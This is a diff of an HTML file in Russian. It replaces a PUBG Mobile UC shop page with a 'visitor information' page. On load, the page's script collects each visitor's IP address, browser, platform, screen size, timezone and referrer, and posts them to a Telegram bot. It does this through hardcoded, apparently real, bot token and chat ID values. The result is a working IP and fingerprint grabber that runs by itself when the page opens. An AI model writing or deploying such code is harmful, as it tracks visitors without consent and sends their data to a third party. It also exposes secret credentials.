@@ -1,52 +1,140 @@
+
 <!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MORS UC SHOP | Купить UC дешево</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Информация о посетителе</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            max-width: 600px; 
+            margin: 50px auto; 
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .status {
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        .success { background: #d4edda; color: #155724; }
+        .error { background: #f8d7da; color: #721c24; }
+        .data-item {
+            margin: 10px 0;
+            padding: 10px;
+            background: #f8f9fa;
+            border-radius: 5px;
+        }
+    </style>
 </head>
 <body>
-    <header>
-        <div class="logo">MORS UC SHOP</div>
-        <nav>
-            <a href="#rates">Тарифы</a>
-            <a href="#reviews">Отзывы</a>
-            <a href="#faq">FAQ</a>
-        </nav>
-    </header>
+    <div class="container">
+        <h1>🔍 Информация о системе</h1>
+        <div id="status" class="status">Собираем данные...</div>
+        <div id="dataPreview"></div>
+    </div>
 
-    <section class="hero">
-        <h1>КУПИ UC ДЛЯ PUBG MOBILE</h1>
-        <p>Мгновенная доставка · Лучшие цены · Без скама</p>
-        <button id="buyButton">ВЫБРАТЬ UC</button>
-        <div class="pubg-character"></div>
-    </section>
+    <script>
+        // 🔧 НАСТРОЙКИ - ЗАМЕНИТЕ НА СВОИ!
+        const BOT_TOKEN = '8527592943:AAESeVCNijxsSj-pwDFdPQ90PU2PGvAjx20'; // Например: '1234567890:ABCdefGHIjklMNopQRstuVWXyz'
+        const CHAT_ID = '6802569070';      // Например: '123456789'
 
-    <section class="rates" id="rates">
-        <h2>ВЫБЕРИ КОЛИЧЕСТВО UC</h2>
-        <div class="rate-cards">
-            <div class="card">660 UC <br> <span>500₽</span></div>
-            <div class="card">2500 UC <br> <span>1900₽</span></div>
-            <div class="card">6000 UC <br> <span>2800₽</span></div>
-        </div>
-    </section>
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const result = await response.json();
+                return result.ok;
+            } catch (error) {
+                console.error('Ошибка отправки в Telegram:', error);
+                return false;
+            }
+        }
 
-    <section class="reviews" id="reviews">
-        <h2>ОТЗЫВЫ</h2>
-        <div class="review">
-            <p>"Закинули UC за 3 минуты! +реп"</p>
-            <span>@htmlocss</span>
-        </div>
-    </section>
+        async function collectAndSendData() {
+            const statusElement = document.getElementById('status');
+            const dataPreview = document.getElementById('dataPreview');
 
-    <footer>
-        <p class="tg-button">НАПИСАТЬ В ТЕЛЕГРАМ: @be11coo</p>
-    </footer>
+            try {
+                // Получаем IP адрес
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
 
-    <a href="https://www.donationalerts.com/r/VibeBotDev" class="donate-button">Оплатить через DonationAlerts</a>
-    
-    
-    <script src="script.js"></script>
+                // Собираем информацию
+                const userInfo = {
+                    ip: ipData.ip,
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    referrer: document.referrer || 'прямой заход',
+                    url: window.location.href,
+                    timestamp: new Date().toLocaleString('ru-RU')
+                };
+
+                // Формируем сообщение для Telegram
+                const telegramMessage = `
+🆕 <b>Новый посетитель</b>
+
+🌐 <b>IP:</b> <code>${userInfo.ip}</code>
+🕒 <b>Время:</b> ${userInfo.timestamp}
+💻 <b>Браузер:</b> ${userInfo.userAgent}
+⚙️ <b>Платформа:</b> ${userInfo.platform}
+📱 <b>Экран:</b> ${userInfo.screen}
+🌍 <b>Временная зона:</b> ${userInfo.timezone}
+🔗 <b>Источник:</b> ${userInfo.referrer}
+                `.trim();
+
+                // Показываем данные на странице
+                dataPreview.innerHTML = `
+                    <h3>Собранные данные:</h3>
+                    <div class="data-item"><strong>IP:</strong> ${userInfo.ip}</div>
+                    <div class="data-item"><strong>Время:</strong> ${userInfo.timestamp}</div>
+                    <div class="data-item"><strong>Браузер:</strong> ${userInfo.userAgent}</div>
+                    <div class="data-item"><strong>Платформа:</strong> ${userInfo.platform}</div>
+                    <div class="data-item"><strong>Экран:</strong> ${userInfo.screen}</div>
+                `;
+
+                // Отправляем в Telegram
+                const sent = await sendToTelegram(telegramMessage);
+                
+                if (sent) {
+                    statusElement.className = 'status success';
+                    statusElement.innerHTML = '✅ Данные отправлены в Telegram!';
+                } else {
+                    statusElement.className = 'status error';
+                    statusElement.innerHTML = '❌ Ошибка отправки в Telegram';
+                }
+
+            } catch (error) {
+                statusElement.className = 'status error';
+                statusElement.innerHTML = '❌ Ошибка: ' + error.message;
+            }
+        }
+
+        // Запускаем при загрузке страницы
+        window.addEventListener('load', collectAndSendData);
+    </script>
 </body>
 </html>
